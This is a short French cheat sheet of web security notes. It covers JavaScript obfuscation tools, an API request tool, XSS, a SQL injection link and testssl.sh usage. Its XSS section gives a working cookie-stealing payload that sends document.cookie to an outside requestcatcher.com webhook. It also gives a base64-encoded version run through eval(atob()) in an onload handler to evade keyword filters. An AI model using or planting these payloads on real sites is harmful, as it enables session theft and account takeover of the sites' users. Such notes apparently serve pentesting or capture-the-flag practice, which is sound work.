# Web

## Obfuscation Javascript

Outil pour obfusquer du Javascript : http://dean.edwards.name/packer/

Outil pour dé-obfusquer du Javascript : https://lelinhtinh.github.io/de4js/

## API

Outil pour requêter une API : https://reqbin.com/

## XSS

```html
// Pour tester
<p id="p1">Testarossa</p>
<script>
document.getElementById("p1").innerHTML = "Life found a way !";
</script>
```

Webhook : https://busterbaxter.requestcatcher.com/
```html
// Pour exploiter
<script>
var script = document.createElement("script");
script.src = "https://busterbaxter.requestcatcher.com/" + document.cookie;
document.body.appendChild(script);
</script>:-)

// Pour bypass les filtres qui recherchent des mots clés : base64 encoded payload
<body onload="eval(atob('dmFyIHNjcmlwdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpO3NjcmlwdC5zcmMgPSAiaHR0cHM6Ly9idXN0ZXJiYXh0ZXIucmVxdWVzdGNhdGNoZXIuY29tLyIgKyBkb2N1bWVudC5jb29raWU7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChzY3JpcHQpOw=='))">
```

## Injection SQL

https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/

## TLS

`testssl.sh` permet de tester :
- versions de SSL/TLS
- suites de chiffrement
- ordre de chiffrement
- certificat
- vulnérabilités connues

Pour lancer :
```bash
git clone --depth 1 https://github.com/drwetter/testssl.sh.git
cd testssl.sh
./testssl.sh --html 172.17.0.2:50051
```
